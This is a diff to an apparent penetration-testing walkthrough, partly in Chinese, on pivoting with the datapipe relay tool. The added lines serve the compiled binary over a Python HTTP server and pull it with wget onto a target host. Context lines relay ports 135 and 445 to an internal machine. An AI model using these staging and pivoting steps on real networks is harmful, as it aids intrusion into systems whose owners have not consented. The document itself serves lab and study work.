@@ -122,6 +122,12 @@ Datapipe
     gcc datapipe.c –o datapipe
 ![image](https://github.com/user-attachments/assets/7e4c5c7d-a7e8-417a-837e-a712ec599572)
 
+    將編譯好的datapipe上傳至.70
+    python3 -m http.server 8888
+    wget 172.19.19.18:8888/datapipe
+![image](https://github.com/user-attachments/assets/7ce28c5f-9757-4b61-8409-526a20ed773f)
+![image](https://github.com/user-attachments/assets/bc29473f-1394-45cd-9f22-a67d580adfd0)
+
     Setup datapipe
     datapipe 0.0.0.0 135 192.168.0.7 135
     datapipe 0.0.0.0 445 192.168.0.7 445
